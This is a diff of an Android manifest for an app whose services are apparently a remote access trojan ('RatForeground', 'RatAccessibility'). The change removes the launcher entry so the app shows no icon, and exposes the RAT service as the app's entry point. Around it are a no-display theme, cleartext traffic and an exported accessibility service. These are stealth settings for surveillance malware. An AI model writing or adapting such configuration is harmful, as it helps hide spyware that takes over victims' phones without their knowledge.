@@ -17,14 +17,13 @@
         android:usesCleartextTraffic="true"
         android:theme="@android:style/Theme.NoDisplay">
         
-        <activity android:name=".MainActivity" android:exported="true">
+        <service
+            android:name=".RatForeground"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
-        
-        <service android:name=".RatForeground" android:exported="false" android:foregroundServiceType="dataSync"/>
+        </service>
         
         <service android:name=".RatAccessibility" android:exported="true" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
